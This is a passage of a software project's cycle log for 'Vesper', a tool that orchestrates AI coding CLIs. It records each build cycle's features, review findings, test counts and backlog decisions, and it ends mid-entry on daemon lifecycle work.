# Vesper cycle log

IMPROVE-step persistence: one entry per completed cycle of the canonical Vesper cycle
(SPEC → PLAN → BUILD → TEST → REVIEW → SIMPLIFY → IMPROVE → SHIP). Capture spec deltas, lessons,
and reusable patterns. Even with nothing to note, record "no deltas — pattern held". When Linear
MCP is unavailable, status transitions are also mirrored here for manual reconciliation.

---

## Foundation — bootstrap (no Linear issue; kickoff authorization)

- Repo confirmed empty post-reset (prior `claw-village` experiments deleted in `e9d8cf5`,
  preserved in git history). No `.archive/` step needed.
- Session-start Linear cross-check found DEV-86/87/88 described an SDK-router architecture
  contradicting the kickoff (CLI shell-out, no provider SDKs). Omar adjudicated: kickoff
  architecture + naming win; reconcile Linear by rewriting the off-issues (show-before-write);
  split Foundation into 7 per-feature issues.
- Wrote `CLAUDE.md` (durable contract) + this log. Next: Bun workspace + package scaffold.
- No deltas — bootstrap proceeded per kickoff.

## Foundation — vault module (DEV-102)

- SPEC/PLAN/BUILD/TEST/REVIEW/SIMPLIFY/IMPROVE run; held at SHIP (no commit yet — Omar gates commits).
- Built: `src/errors.ts` (VesperError base), `src/process/run.ts` (the single Bun.spawn seam +
  CommandNotFoundError/ProcessTimeoutError), `src/vault/` (Vault interface, KeychainVault over the
  `security` CLI, VaultError). 14 tests, 100% line+func coverage, Biome clean.
- Delta: `security add-generic-password -w <value>` exposes the secret in subprocess argv
  (same-user `ps`), not shell history. The `vesper vault set` command must read the value via
  stdin/prompt. Captured for DEV-103.
- Pattern held (now the template for storage/cli/ipc): VesperError base + typed per-module reason;
  one injectable `ProcessRunner` seam, mocked in tests; immutable updates; `bun:test`.

## Foundation — storage (DEV-87), cli adapters (DEV-88), ipc (DEV-105) — parallel sub-agents

- Built concurrently by three Sonnet sub-agents, each scoped to its own directory, following the
  vault pattern; the leader (main thread) owned Linear status, REVIEW, SIMPLIFY, and integration.
- storage: bun:sqlite + forward-only migrations (events/runs); synchronous Store API (matches the
  backend); parameterized queries (injection-safe). SIMPLIFY removed a redundant schema_migrations
  DDL from the v1 migration.
- cli: CLIAdapter + BaseAdapter (DRY) over the shared runProcess seam; detect/select; CLIError.
  SIMPLIFY replaced sentinel booleans with nullish-coalescing.
- ipc: Bun.listen/Bun.connect Unix-socket stub; ping/501; settle-guarded client.
- Deltas: synchronous Store vs async Vault (accepted — each matches its backend). `vesper vault set`
  must read the secret via stdin (vault REVIEW delta).
- INTEGRATION: wired the vesper-core barrel (cli/ipc/storage/vault all re-exported, no name
  collisions — 20 value exports resolve). Full suite: 95 tests, 0 fail; coverage 100% on
  vault/storage/cli, ipc 83-99%. `bun run lint` clean (41 files). Pattern held across all three —
  the parallel-sub-agent approach worked with zero cross-module conflict.
- Holding all four core modules at SHIP for a single batched commit approval.

## Foundation — vesper-cli scaffold (DEV-103)

- Built in the main thread (the "must look great + scalable" centerpiece). Command-registry/
  dispatcher (no central switch), hand-rolled args + config (no commander/zod), `ui` module
  (color/aligned output, plain on non-TTY/NO_COLOR). Commands: init, vault set/get/list, cli
  list/select, status, daemon, + auto help.
- 18 unit tests on the pure helpers (args/config/ui/dispatch); command glue smoke-tested live.
- END-TO-END smoke (temp VESPER_HOME) proved real orchestration: init detected all 4 CLIs; status
  probed claude OK; cli list probed claude/opencode/codex OK (gemini timeout, handled); daemon +
  socket ping -> {ok:true, version:"0.1.0"}, unknown -> 501. Zero provider SDKs; pure shell-out.
- Delta resolved: `vault set` reads the secret from stdin, not a shell arg.

## Foundation — vesper hello (DEV-104)

- `commands/hello.ts`: loadConfig -> selectDefault -> buildAdapter -> complete(fixed prompt) -> print.
- Live smoke: shelled out to claude, got a real non-empty sentence (exit 0). The bring-your-own-CLI
  proof — a real LLM response with no Vesper-held API key, pure Bun.spawn, no SDK. Holding at SHIP.

## Foundation — README + final review (DEV-106) + FOUNDATION COMPLETE

- README.md: mechanics-first; install/init/hello; explicit bring-your-own-CLI; no "Agent OS"; no emojis.
- Full acceptance gate GREEN: bun install clean; no provider SDK; bun test 113/0 (100% on
  vault/storage/cli); lint clean (57 files); all CLI commands smoke-validated incl. real shell-out
  + daemon ping. CLAUDE.md "Where we are" updated.
- IMPROVE (Foundation retro): the dogfood pass held — every feature ran the full
  SPEC->PLAN->BUILD->TEST->REVIEW->SIMPLIFY->IMPROVE cycle with Linear status transitions. Three
  independent modules built by parallel Sonnet sub-agents (scoped to their dirs, no shared-file
  edits, mocked process seam) integrated with zero conflict; vault-first set the reusable pattern.
  Reusable lesson for Scheduler: this orchestration (leader owns Linear + integration + REVIEW;
  sub-agents own scoped BUILD) is the template for autonomous pipelines.
- All 7 feature issues sit "In Review" — holding for one batched commit approval (no-local-commits).

## Scheduler — scheduler core (DEV-107)

- Foundation merged (PR #3, 3f85395). Entered Scheduler: DEV-91 reconciled to bring-your-own-CLI +
  split into DEV-107..110; architecture approved (hand-rolled cron, in-process event bus, run-count
  caps not USD, scheduler in vesper-core hosted by `vesper daemon`, not blocked on DEV-89).
- DEV-107 built via sub-agent: scheduler/ (Scheduler, cron parser, event bus, handler registry,
  persistence) + storage migration 002 (scheduled_tasks).
- REVIEW caught a real bug: handler failures re-thrown as SchedulerError("unknown_task") and tick()
  awaited per-task in a loop, so one failing task aborted the rest. Fixed: record last_error, tick()
  isolates failures, run() propagates the original, events swallow. Added isolation/propagation tests.
- Full suite 205 / 0; lint clean (67 files); barrel resolves. Holding at SHIP for the Scheduler PR.
- Remaining: DEV-108 guardrails, DEV-109 capability enforcement, DEV-110 schedule CLI.

## Scheduler — task guardrails (DEV-108)

- Built via sub-agent on feat/scheduler-rest (stacked on feat/scheduler-core, since it builds on
  the unmerged core). Migration 003 (caps/bookkeeping columns + failed_tasks). Run-count/duration
  caps + exponential backoff + dead-letter; max_concurrent in-memory.
- REVIEW caught the recurring mislabel: cap-blocked manual run() threw SchedulerError("unknown_task").
  Fixed: added a "cap_exceeded" reason + a test. Core contract preserved.
- Full suite 226 / 0; scheduler 100% lines; lint clean. Holding at SHIP (Scheduler-rest PR).
- DEV-107 is PR #4 (open, awaiting review/merge). 108-110 stack on feat/scheduler-rest -> PR-B.

## Scheduler — capability enforcement (DEV-109)

- The capabilities module was never built (dropped from the approved Foundation 7-feature split),
  so DEV-109 created it: Capability union (8 values per the kickoff), CapabilityError,
  deny-by-default assertCapabilities/isGranted. Wired a pre-execution check into #invoke (after
  caps, before handler): scheduled denial disables + records (no backoff — operator error); manual
  throws CapabilityError. Migration 004 (required_capabilities). Wired into the core barrel.
- Full suite 259 / 0; new files 100% lines; lint clean (74 files). Holding at SHIP (PR-B).

## Scheduler — vesper schedule CLI + daemon wiring (DEV-110)

- vesper-cli: `schedule` group (list/show/run/enable/disable) over the scheduler; daemon wires a
  60s tick loop with clean shutdown. ANSI-aware aligned table; actionable errors; run surfaces
  unregistered-handler ("handlers are provided by pipelines").
- Full suite 270 / 0; lint clean (76 files). Scheduler phase functionally complete (handlers come
  with pipelines later).
- Minor future cleanup: expose the Store's db (or have Scheduler accept a Store) so the CLI/daemon
  don't openStore().close()+new Database().

## CI — GitHub Actions gate (DEV-111)

- Triggered by a flaky-test report: 3 `ui` tests failed only under an interactive TTY because
  `colorEnabled()` reads `process.stdout.isTTY`, which is true in a terminal but undefined when
  piped (CI / Bash tool). Fix: force `NO_COLOR` for that describe block (save/restore) so the
  plain-mode assertions are environment-independent. Lesson: tests must control their inputs, never
  read ambient globals — same seam discipline as the injected clock / process runner elsewhere.
- Omar pulled CI forward from Launch (overriding Hard rule 10, which is amended to record it).
  Added `.github/workflows/ci.yml`: `bun install --frozen-lockfile` -> `bunx biome ci .` -> `bun
  test`, on push to main + PRs. `biome ci` (not split lint/format) keeps CI == the local gate incl.
  import-order. DEV-111 created In Review; SHIP pending Omar's commit authorization.

## Dev tooling — single-source .ai/ agent-docs + multi-CLI fan-out

- Replicated eoa-server's single-source agent-docs architecture (its ADR-0001) at Omar's request:
  one hand-edited source under `.ai/` drives Claude Code, opencode, Codex, Gemini, and Cursor — the
  same four CLIs Vesper's bring-your-own-CLI adapters target.
- `.ai/context.md` (project contract, migrated from CLAUDE.md + source-of-truth header + refreshed
  "Where we are") + `.ai/pipeline.md` (the Vesper cycle, rewritten — not eoa's lifecycle — plus the
  Agent Teams parallel-work section and the 3-layer memory protocol). `scripts/sync-ai-docs.ts`
  (`bun run sync:ai`) generates AGENTS.md (inline canonical) + CLAUDE.md/GEMINI.md (@-import stubs)
  + `.cursor` symlink, and materializes `.claude/.opencode/.gemini` agents+skills. `.githooks/
  pre-commit` (wired via `core.hooksPath`, auto-set by the `prepare` script) guards freshness.
- Curated: 4 agents (code-reviewer, security-auditor, test-engineer copied as-is;
  performance-reviewer authored fresh for Vesper's Bun/sqlite/scheduler domain — eoa's was a
  tx-sender placeholder), 15 cycle-relevant skills, 4 references. Dropped commands (the
  agent-skills plugin provides slashes globally) and `.mcp.json` (no project-scoped MCP servers).
- CLAUDE.md is now a GENERATED stub — the biggest change; the real contract lives in `.ai/`.
- Verified: sync is deterministic (second run byte-identical); `bun test` 270/0; `biome ci .` clean
  (78 files); CLAUDE.md `@`-resolves to the full contract with all 13 hard rules intact.
- RULE 11 FALLBACK: the Linear issue for this work could not be filed — the workspace hit its
  free-tier issue cap right after DEV-111. Per the contract's Linear-unavailable fallback, this
  entry is the record. RECONCILE: open a `chore/tooling` DEV issue (OpenSpec body drafted in the
  session) once the cap is lifted, and backfill the status trail.
- SHIP pending Omar's commit authorization (standing no-local-commits rule); nothing committed yet.

## First pipeline — runtime context + `echo` validator

- Built the pipeline runtime contract the scheduler was missing: a capability-gated
  `PipelineContext` (`scheduler/context.ts`) handed to every handler — `ctx.complete` (gated on
  `CLI_INVOKE`), `ctx.recordRun` (gated on `WRITE_STORAGE`), `ctx.params`, `ctx.task`, `ctx.now`.
  The gate is a two-layer model that coexists with DEV-109: the method asserts the capability is
  *declared* in `task.required_capabilities` (self-declaration, at the context boundary, before any
  side effect), while the scheduler independently asserts declared ⊆ host-granted. Verified there is
  no TOCTOU window — the assert is the first statement in each method on immutable captured state.
- `Scheduler` now holds a `SqliteStore` (wrapping the already-migrated handle — no double-migrate)
  and an injected `CompleteFn`, keeping `vesper-core` free of config/path concerns (the resolver is
  built in the CLI layer, `cli-resolver.ts`). `run(id, options)` threads a per-run `{ cli, params }`
  through `#invoke` into the context; scheduled (cron/event) runs pass none (params `{}`, no override).
- New `@vesper/pipelines` workspace with the `echo` pipeline + `registerPipelines`; `vesper schedule
  run echo --cli <name> [--param k=v]` and `vesper daemon` both wire it in with `grants: CAPABILITIES`.
- GOTCHA (caught by the acceptance smoke test, not the unit suite): the zero-dep `parseArgs` treated
  `--cli claude` (space form, which the spec uses) as `flags.cli = true` PLUS a stray positional, so
  the `--cli` override was silently ignored and the default always ran. Fix: `parseArgs` now takes an
  explicit `valueFlags` set (`dispatch` passes `{cli, param}`) so named value-flags consume their next
  token; default empty set preserves the documented "flags never consume positionals" contract and all
  existing arg tests. Lesson: an end-to-end smoke test catches CLI-plumbing bugs that perfectly-passing
  unit tests (which fed `flags` directly) never will — the manual acceptance pass is non-negotiable.
- Parallel-work: lead built the core contract (the crux, tight type coupling) directly, then two
  file-disjoint sub-agents built `packages/pipelines/` and the `vesper-cli` wiring concurrently, then
  a 3-way REVIEW fan-out (code-reviewer + security-auditor + test-engineer). Review caught real gaps:
  (1) the integrated `scheduler.run(id, options)` path + the "runs row + last_run_at" SHALL were
  proven only by smoke — added `scheduler-context.test.ts`; (2) `parseRunParams` flag-form branch
  untested — added; (3) resolver override could silently fall back — tightened to honor an installed
  override verbatim; (4) an exit-0 empty completion recorded `ok` — now `error` ("a self-test with no
  output is a failed echo"). SIMPLIFY: dropped `registerPipelines`' redundant `list()` pre-check (the
  `duplicate_task` catch already covers idempotency, and removing it made that catch a tested path).
- DELTAS for skill-train (next, the "auto-evolve" pipeline): it inherits this exact context contract
  and is the first multi-capability pipeline (`CLI_INVOKE, READ/WRITE_STORAGE, FS_READ, FS_WRITE`) —
  good stress test of the gate. Follow-ups flagged by review, deferred (NOT blockers for a self-test
  pipeline): `runs.summary` persists raw CLI output in cleartext (redaction/metadata-only mode before
  pipelines store third-party/PII output), and the daemon grants the full `CAPABILITIES` set (narrow
  to the union actually declared by registered pipelines before untrusted pipelines ship).
- RULE 11 FALLBACK: Linear workspace still issue-capped; this entry + `specs/first-pipeline.md` are
  the record. RECONCILE to a DEV issue when the cap lifts. SHIP pending Omar's commit authorization
  (standing no-local-commits rule) — nothing committed.

## skill-train (auto-evolve) — core slices 1-2

- Built the SkillOpt-style self-optimization core on top of the new pipeline runtime. Module
  `packages/vesper-core/src/skill-train/`: `frontmatter` (tiny name/description YAML parser, shared),
  `skill` (loadSkill: SKILL.md + sibling tasks.json, injectable fs), `scorers` (exact_match/contains
  pure + makeJudge LLM-as-judge via injected CompleteFn — Hard rule 12), `optimizer` (deterministic
  meta-prompt + parseCandidate that enforces frontmatter name/description preservation), `persistence`
  (~/.vesper/skill-train/<name>/{best.md,history.jsonl} via injected baseDir), and the heart `train`
  (epoch loop: rotating batch -> target trajectories -> optimizer rewrite -> full-set validation ->
  greedy val-strict accept, shorter-on-tie). Plus the `skill-train` PIPELINE — the first
  multi-capability pipeline ([CLI_INVOKE, READ/WRITE_STORAGE, FS_READ, FS_WRITE]), reading paths
  from ctx.params so core stays path-agnostic. 68 tests; 410 total / 0 fail; biome clean.
- Parallel-work: lead laid the shared contract (types/errors/frontmatter), then THREE file-disjoint
  sub-agents built skill.ts / scorers.ts / optimizer.ts concurrently; lead wrote persistence + train
  + the pipeline + integration test. A focused code-review pass confirmed the accept/history logic
  correct and caught: (HIGH) the epoch catch was reason-blind — a judge misconfig surfacing mid-run
  would be swallowed as "no improvement"; now only `parse_failed` is a skippable epoch, everything
  else propagates. (HIGH) the per-run CLI-call cost is N + epochs*(batch+1+N), NOT the spec's ~16 —
  reconciled the spec's cost model + flagged held-out validation as the future cut. (MEDIUM)
  `HistoryEntry.baselineScore` collided in meaning with `TrainResult.baselineScore` — renamed to
  `priorBestScore`. (MEDIUM) handler `numParam` now validates positive integers at the param
  boundary and throws typed `SkillTrainError`. (LOW) optimizer header re-numbering after sort + mean
  score `toFixed(3)`.
- GOTCHA: run params are all strings (the CLI `--param k=v` / positional `k=v` path yields
  `Record<string,string>`), so the pipeline coerces epochs/batchsize and must validate them — a good
  reminder that the param channel is an untrusted system boundary even for "internal" pipelines.
- DEFERRED to the next increment (T6/T7): `vesper skill {train,list,diff,revert}` CLI with the
  cost-confirmation prompt and per-role adapter flags (`--cli`/`--optimizer-cli`/`--judge-cli`), and
  the user-acked IMPROVE write-back to the committed `.ai/skills/<name>/SKILL.md` + a seed `tasks.json`
  for one real skill to validate the loop against a live CLI. Also still open from first-pipeline:
  narrow daemon grants from full CAPABILITIES to the declared union; redact/meta-only `runs.summary`.
- RULE 11 FALLBACK: Linear still capped; `specs/skill-train.md` + this entry are the record. SHIP of
  this increment pending Omar's explicit commit authorization (standing no-local-commits rule) —
  skill-train is NOT committed (first-pipeline was committed on branch feat/first-pipeline, sha f6a2044).

### skill-train — final pre-merge review hardening
- A second (pre-merge) review fan-out (code + security on both first-pipeline and skill-train) returned
  no CRITICAL/HIGH; both MERGE-READY / SAFE TO MERGE. Acted on two cheap findings before pushing:
  (1) the skill-train handler recorded `status:"error"` for a legitimate "no improvement"/dry-run run —
  now `ok` (improved or dry-run inspection) vs `no_change` (no candidate beat baseline); `error` is
  reserved for thrown failures. (2) Added `assertSkillName` (slug guard) wired into `loadSkill` +
  `SkillTrainStore.dir` to close the param-driven path-traversal trust boundary BEFORE any IPC/remote
  surface feeds `skill`/`*Dir` params. Still open follow-ups: narrow daemon grants to declared union;
  redact/meta-only `runs.summary`; held-out validation split; `--judge-cli` up-front validation.

## improve-pipelines workflow — results + backlog

Ran a multi-agent workflow (33 agents) to improve the pipelines: 6 dimension analysts ->
adversarial verify each finding -> synthesize. 10 confirmed -> 8 after dedupe. Applied the
S-effort quick wins + the two real bugs immediately:
- (PR #6 / runtime) narrow daemon+schedule grants to `grantedCapabilities()` (union of declared
  pipeline caps) so the deny-by-default check is meaningful; clear the duration-cap setTimeout in a
  finally (timer leak kept the event loop alive up to max_duration_ms); daemon banner derived from
  the registry instead of a hardcoded "echo".
- (PR #7 / skill-train) judge scorer read the FIRST number, so a preamble integer ("Task 1...")
  clamped to 1.0 and silently inflated scores driving greedy accept — now prefers the first DECIMAL
  (the score), integer-only fallback. Regression tests added.

### M-effort backlog (next increment — pair with the deferred skill-train CLI surface T6/T7; each needs a SPEC/PLAN + Linear issue when the cap lifts)
1. `Scheduler.run` returns a typed `RunOutcome` (runId/status/summary/resolved cli/duration_ms) and
   `vesper schedule run` renders it (+ `--quiet`). Biggest UX gap today: run id/summary are discarded.
2. `vesper runs list [--pipeline --status --limit]` — `store.listRuns` exists and every pipeline
   writes a row, but nothing surfaces them. Extract the shared table formatters out of schedule.ts first.
3. Per-role adapter wiring in the skill-train handler — build per-role CompleteFns bound via
   `ctx.complete({cli})` so `--cli`/`--optimizer-cli`/`--judge-cli` (T6) actually route; wire `makeJudge`.
4. Held-out validation split in `trainSkill` (deterministic `splitTasks`, opt-in `valFraction`) to cut
   the per-run `+N` validation shell-outs and remove train/val overlap.
Deferred further: AbortSignal-based handler cancellation; an opt-in real-CLI smoke harness
(`VESPER_LIVE_SMOKE`, kept out of CI `bun test`).

## CLI onboarding (T1-T6) — backfilled IMPROVE entry

(Backfill: this cycle shipped in commit `a7dbcad` but its IMPROVE step was never logged — recorded
now during the plan reconciliation.) Shipped working-CLI verification + `vesper cli list` with
version display, an 8s probe timeout, and per-CLI remediation hints; `vesper cli install <name>`
(claude/codex/opencode/gemini/cursor) with a TTY guard, Bun prerequisite, already-installed guard,
and alias support (cursor-cli -> cursor); and a `vesper init` redirect hint when no working CLI is
detected. Lesson: the IMPROVE step is non-skippable — an unlogged cycle is invisible to the plan and
had to be reconstructed from git later.

## Plan reconciliation — contract de-staled, Tauri/Rust rule added

Ran the `reconcile-plan` workflow (5 agents, 38 findings) auditing the Linear spine + specs +
contract against repo ground truth (verified: 428 tests, ZERO Tauri/Rust deps in any package.json,
no `vesper skill`/`vesper runs` command, migrations stop at `004`). Applied the documentation
reconciliation (no code change):
- **NEW Hard rule 14 — no Rust/Tauri by default.** Every user-facing surface uses the existing
  Bun/TypeScript/web stack; Tauri/Rust is opt-in only when a capability strictly requires a native
  shell, and only after surfacing to Omar. The prior "Desktop = Tauri" framing is SUPERSEDED. The
  Desktop phase is redefined as an **elder-first consumer UI** (usable by a non-technical 70-year-old);
  the `vesper` CLI is the developer-only surface. [Omar's authoritative direction this session.]
- De-staled `.ai/context.md`: Desktop phase row + reconciliation footnote, a UI Stack bullet, the
  Foundation out-of-scope line, the "Where we are" section (270->428 tests; first-pipeline +
  skill-train recorded as SHIPPED under the issue-cap fallback; "Next" rewritten), the positioning
  gate (re-anchored off "Desktop" to "a demoable consumer UI"), and a documented **Linear issue-cap
  exception** (record work as specs/+cycle-log when the cap blocks issue creation; does not relax the
  no-self-create / no-improvise rule). Regenerated AGENTS.md/CLAUDE.md/GEMINI.md/.cursor via sync:ai.
- De-staled spec headers: first-pipeline (SHIPPED, 428), skill-train (SHIPPED core; CLI T6/T7 still
  unbuilt), pipeline-scheduler (SHIPPED), cli-onboarding (SHIPPED T1-T6), ui-react-page-pipeline
  (flagged: it is a code-gen pipeline, NOT the elder-first shell; its "full runtime contract" /
  migration 005 / ctx.writeFile was never built — the shipped PipelineContext is minimal).

### Reconciled next-steps backlog (buildable now, pure Bun/TS, unblocked — each its own cycle)
1. **Run-outcome visibility** (M) — `Scheduler.run` returns a typed `RunOutcome`
   (runId/status/summary/cli/durationMs); `vesper schedule run` renders it (+ `--quiet`); add
   `vesper runs list [--pipeline --status --limit]` over `store.listRuns`. Extract the shared ANSI
   table formatter out of `schedule.ts` into a `vesper-cli/src/ui` helper first. Prerequisite for ANY
   UI (the runs are written but never read back).
2. **`vesper skill {train,list,diff,revert}` CLI** (M) — surface the already-built skill-train engine
   (currently only reachable via `schedule run skill-train --param`); includes the projected-call-count
   cost-confirmation prompt + per-role `--cli`/`--optimizer-cli`/`--judge-cli` routing via
   `ctx.complete({cli})` + `makeJudge`. Defer T7 write-back to its own user-acked step.
3. **`runs.summary` redaction / metadata-only mode** (S) — flagged 3x, never built; prerequisite
   before an elder-first UI renders run summaries to a non-technical user.
4. **Held-out validation split for skill-train** (S) — `splitTasks(tasks, valFraction)` so validation
   uses a held-out subset (cuts the per-run `+N` validation shell-outs; removes train/val overlap).

### BLOCKED on Omar (product decision, not the issue cap)
5. **Elder-first consumer UI** (L) — needs a new `specs/elder-first-ui.md` capturing the 2-3 tasks a
   non-technical user performs, the surface (daemon-served web app? menubar?), and confirmation of the
   Bun/TS/web stack (Hard rule 14). Ranks 1-4 are the correct enabling plumbing to land first,
   regardless of the eventual UI shape. HALT on implementation pending Omar.

## Run-outcome visibility (backlog #1) — SHIPPED

Made pipeline runs visible (prerequisite for any UI). `Scheduler.run(id, opts)` now returns a typed
`RunOutcome` { taskId, runId, status, summary, cli, durationMs } — captured via an `onRecordRun` hook
threaded into the `PipelineContext` (the success path fills a capture object; manual guardrail skips
still throw, so a manual run always yields an outcome). `vesper schedule run` renders the outcome
(status/cli/duration/run id/summary) with a `--quiet` opt-out. New `vesper runs list
[--pipeline --status --limit]` reads `store.listRuns` — the runs every pipeline writes were never
surfaced before. Extracted the ANSI-aware table renderer (`visibleLength`/`padVisible`/`table`) out
of schedule.ts into the shared `ui.ts` so `schedule list` and `runs list` share one formatter.
Tests: RunOutcome integration assertion, ui table unit tests, runs-command tests (filters + empty).
436 tests / 0 fail; biome clean. Verified end-to-end (outcome render + runs table).

## `vesper skill` CLI (backlog #2) — SHIPPED

Surfaced the already-built skill-train engine as `vesper skill {train,list,diff}` (reusing the
`skill-train` pipeline via `scheduler.run`, so it inherits capability-gating + the rank-#1
RunOutcome). `train <name>` loads the skill to count tasks, prints a projected CLI-call count
(`N + epochs*(batch+1+N)`), confirms before spending quota (TTY prompt or `--yes`; non-TTY without
`--yes` refuses), then runs with per-role adapters — `--cli`/`--optimizer-cli`/`--judge-cli` now
route via `ctx.complete({cli})` + `makeJudge` (wired into the pipeline handler). `list` shows
trainable skills (those with a tasks.json); `diff` shows the committed SKILL.md vs the trained
best.md (via `git diff --no-index`). DEFERRED: `revert` + writing back to the committed
`.ai/skills/<name>/SKILL.md` (T7) — they only make sense once train can mutate the repo SKILL.md,
which stays a separate user-acked step. Tests: projectCalls, list (harness filter), diff-no-candidate.
441 tests / 0 fail; biome clean. Smoked list + dry-run train end-to-end (recorded run visible in
`vesper runs list`).

## runs.summary redaction (backlog #3) — SHIPPED (opt-in)

Closed the thrice-flagged security item: raw CLI output persisted in cleartext in `runs.summary`.
Added `redactSummary(summary)` -> `[redacted: N chars]` and a `redactSummaries` Scheduler option
threaded into the `PipelineContext.recordRun` boundary, so when enabled the stored summary (and the
RunOutcome) is size-only metadata; the status is kept verbatim (never sensitive). Wired from a new
config flag `storage.redactRunSummaries` (default FALSE — no behavior change; observability via
`vesper runs list` is preserved unless the user opts in) at all three Scheduler sites (daemon,
schedule run, skill train). This is the prerequisite for an elder-first UI rendering run summaries
of pipelines that touch third-party/PII data. Tests: redactSummary unit, context recordRun redaction,
config normalization. 444 tests / 0 fail; biome clean.

## Held-out validation split for skill-train (backlog #4) — SHIPPED (opt-in)

Fixed the correctness/cost issue flagged in review: `trainSkill` validated every candidate against
the FULL task set (per-run cost N + epochs*(batch+1+N), with train/val overlap). Added
`splitTasks(tasks, valFraction)` (deterministic: first `round(N*frac)` tasks held out for validation,
clamped to leave >=1 training task; <2 tasks or out-of-range fraction => no split = original
behavior). `trainSkill` now samples optimizer batches from the training set and scores baseline +
candidates only on the held-out validation set when `valFraction` is given. Exposed end-to-end:
pipeline handler reads a `valFraction` param; `vesper skill train --val-fraction F`. Default unchanged
(no split) so existing behavior + tests are preserved. Cost model with held-out: baseline |val| +
epochs*(min(batch,|train|) + 1 + |val|). Tests: splitTasks (determinism, clamp, no-split edges) +
a trainSkill held-out assertion (baseline reflects only val tasks). 449 tests / 0 fail; biome clean.

## Backlog close-out — remaining Linear issues assessed (per "let me know if any issue doesn't make sense")

Ranks 1-4 shipped (run-outcome visibility, vesper skill CLI, runs.summary redaction, held-out
validation). Remaining Linear / backlog, with verdicts:
- **Elder-first consumer UI** (the Desktop direction) — BLOCKED on Omar's product decision. No Linear
  issue, no shell spec. Needs `specs/elder-first-ui.md` (the 2-3 tasks a non-technical 70yo does, the
  surface — daemon-served web app? menubar? — and Bun/TS/web stack confirmation per Hard rule 14).
  Not buildable without those answers; HALT.
- **DEV-89 (daemon lifecycle)** — sensible (a real runtime wants start/stop/status/background service),
  but its shape depends on the elder-first UI surface (does the dad-facing app embed the daemon, run
  it via launchd, etc.). Recommend deferring until the UI decision lands so we build the right shape.
- **DEV-93 (global capture via macOS Shortcuts)** — DOES NOT MAKE SENSE as written. Its body is
  pre-pivot: references an "LLM router + adapter chain", a vault-held Anthropic API key, `packages/
  daemon`, `packages/cli` — none of which match the bring-your-own-CLI architecture. Its power-user
  "highlight text -> hotkey -> LLM" framing also may not fit the elder-first direction. Needs a
  rewrite to the current architecture + a fit-review against elder-first BEFORE any build — flagging,
  not building.

## Elder-first UI — "Vesper World" MVP (T1-T7) — SHIPPED

Built the Desktop-phase consumer UI per specs/elder-first-ui.md, autonomously, to a "looks sick"
bar (verified in a real browser via agent-browser). New `@vesper/ui` workspace:
- T1 pure World model: `buildWorld(snapshot, seed) -> SceneGraph` — one inhabitant per pipeline,
  deterministic seeded layout, prominence ∝ run share, mood from last run, liveliness from total
  activity. Fully unit-tested, no DOM.
- T2 core: scheduler emits `vesper:run:completed` (RunOutcome) on its EventBus after every run.
- T3 server: daemon-hosted `Bun.serve` on 127.0.0.1 — `/api/world` (SceneGraph), `POST /run`, serves
  the Bun-bundled client.
- T4 live: `WS /api/live` pushes run:completed to browsers.
- T5: the daemon hosts the UI in-process (one runtime; live EventBus events; seed = machine
  fingerprint); `vesper ui` requires the daemon (IPC ping) and opens a browser tab.
- T6 client: Canvas 2D pixel-art world — deterministic seeded creatures (clean silhouette outline +
  top highlight + eyes), mood glow, idle-bob / working-pulse / run-pop, starfield + drifting motes +
  vignette; click -> plain-language inspect card (status, last result, run count) + a big Run button;
  live updates. Elder-first: minimal text, big targets, plain language.
- T7 module seam: `UiModule` + `AgentAddon` + `ModuleRegistry` (augmentAgent + onRunCompleted),
  wired into the server (run:completed dispatch); ZERO modules enabled — locks the Voice-module
  contract cheaply (Voice = speak the result aloud, lands with the Voice phase).
Stack: Bun/TypeScript/web + Canvas 2D only — NO Rust/Tauri (Hard rule 14). 470 tests / 0 fail; biome
clean. GOTCHA: the daemon builds+caches the client bundle at startup, so visual changes need a daemon
restart to appear. DEFERRED (T8 fast-followers): a richer first-launch onboarding overlay,
animation/customization depth, multiple UI templates, and the Voice module. A formal REVIEW fan-out
was skipped under time pressure (tests + browser verification stand in) — recommend a review pass
before merge.

## Echo — live agent presence in Vesper World — SHIPPED

The world now shows the "echo" of agents actually running on this machine, not just Vesper's own
pipeline runs (Omar: "the echo of agents running into this PC should appear there"). No Linear issue
(issue cap) — record is this entry + the commit. Spec: `specs/echo-presence.md`.
- Detection core (`vesper-core/src/presence/`): `detectAgents(rows, matchers)` — pure, allowlist of
  serializable regex matchers over the FULL command line, deduped per matcher to one `AgentPresence`
  (representative = shortest args = the main process). `psProcessLister` is the impure `ps -axo
  pid,etime,args` seam (via the existing `ProcessRunner`); typed `PresenceError(ps_unavailable)`.
- KEY DISCOVERY (verified on the real process table): agent CLIs run as `node`/`bun`, so `comm` is
  useless — match `args`. Desktop apps spawn an Electron helper swarm — anchor app matchers to
  `/<App>.app/Contents/MacOS/<App>` so helpers don't register as separate agents. Allowlist-bound, no
  fuzzy matching -> no false positives (a `vim claude-notes.md` or a `zeroclaw` repo path won't match).
  Validated live: detected Claude desktop + Claude Code CLI (7 procs) + Codex desktop/CLI.
- World merge: `buildWorld` stays pure — `WorldSnapshot.presences` feeds `live` inhabitants that float
  in an upper band, seeded position stable per agent id; running agents raise `liveliness`.
- Server: daemon-hosted poll (3s) via an injectable `PresenceDetector` (defaults to the real `ps`
  scanner, failure-safe -> []); pushes a `presence` WS message only when the set changes (signature
  compare). Client renders a teal "heartbeat" ring + a read-only "running now" card (Run hidden).
- Allowlist ships claude/codex (app+cli), opencode, gemini, zeroclaw; overridable via config.
- Renamed the `echo` validator pipeline -> `selftest` to free the name "echo" for this feature
  (Omar-approved); contract + demo gif updated. Added the `echo` dev sub-agent persona.
- 498 tests / 0 fail; biome clean; no provider SDKs. DELTA vs spec: the per-machine `presence.matchers`
  config override is NOT yet wired into the server (the engine accepts custom matchers + is tested;
  only the config read is pending) — logged as the next follow-up. GOTCHA (still true): a running
  daemon caches the build at startup, so picking up new matchers (e.g. zeroclaw) needs a daemon restart.

## presence.matchers config override — SHIPPED

Closed the echo follow-up: `presence.matchers` (+ `pollMs`) in `~/.vesper/config.json` are validated
(drop bad `kind`/uncompilable regex; reject non-positive poll) and merged with the built-in allowlist
in the daemon (`presenceDetectorFor(matchers)`). Users add agents without code. Proven live (a temp
config's custom matcher surfaced the running daemon; bad-regex entry dropped). README documented. 1 commit.

## DEV-89 — daemon lifecycle — SHIPPED (completed, not the original spec)

The Linear issue predates the bring-your-own-CLI pivot (assumed an `llm_router`, `vesper ask`,
vault-over-IPC JSON-RPC, `packages/daemon`). Built the ALIGNED core, adapted the rest away:
- `vesper daemon` is now a command GROUP: `run` (foreground; the launchd/managed target),
  `start`/`stop`/`restart` (detached lifecycle via a PID file + single-instance guard),
